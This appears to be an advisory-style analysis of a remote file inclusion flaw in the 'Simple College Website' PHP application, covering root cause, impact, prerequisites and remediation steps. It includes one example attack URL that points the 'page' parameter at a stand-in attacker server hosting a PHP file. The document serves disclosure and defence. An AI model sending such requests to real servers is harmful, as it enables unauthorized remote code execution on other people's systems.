Based on the provided information, here's an analysis of the vulnerability:

**Root Cause:**

*   The vulnerability lies in the lack of input validation and sanitization in the `admin/index.php` file of the Simple College Website application. Specifically, the `page` parameter in the URL is directly used in an `include` statement without any checks.

**Weaknesses/Vulnerabilities:**

*   **Remote File Inclusion (RFI):** The application is vulnerable to RFI because it allows the inclusion of remote files via the `page` parameter.

**Impact of Exploitation:**

*   **Remote Code Execution (RCE):** By including a malicious PHP file hosted on an attacker-controlled server, the attacker can execute arbitrary code on the server running the vulnerable application.
*   **Unauthenticated Access:** The vulnerability is exploitable without requiring authentication.

**Attack Vectors:**

*   **HTTP GET Request:** The attacker crafts a malicious URL with the `page` parameter pointing to a remote PHP file.
    *   Example: `http://<target>/college_website/admin/index.php?page=http://<attacker_server>/exploit.php`

**Required Attacker Capabilities/Position:**

*   **Network Access:** The attacker needs network access to the vulnerable server to send the malicious request.
*   **Web Server:** The attacker needs a web server to host the malicious PHP file to be included.
*   **No Authentication Required:** The attacker does not need any valid credentials to exploit this vulnerability.

**Additional Details:**

*   The exploit requires the `allow_url_include` directive to be set to "On" in the `php.ini` configuration of the server.
*   The provided exploit PHP code `exploit.php` simply executes a `phpinfo()` command for demonstration purposes.
*   The application's source code is available on SourceCodester.
*   The vulnerability was discovered and reported by @fuffsec.

**Remediation:**

The provided remediation advice from the article includes:

1.  **Authentication of requests:** Implement authentication mechanisms to verify users accessing the page.
2.  **File location checking:**  Validate the file paths before including them, restricting it to specific directories.
3.  **Disabling allow_url_include:** Turning off the `allow_url_include` directive to prevent remote inclusions, and to enforce local file inclusion only.
4.  **Input sanitization and validation:** Implement proper input validation and sanitization to ensure the `page` parameter cannot include malicious URLs or file paths.
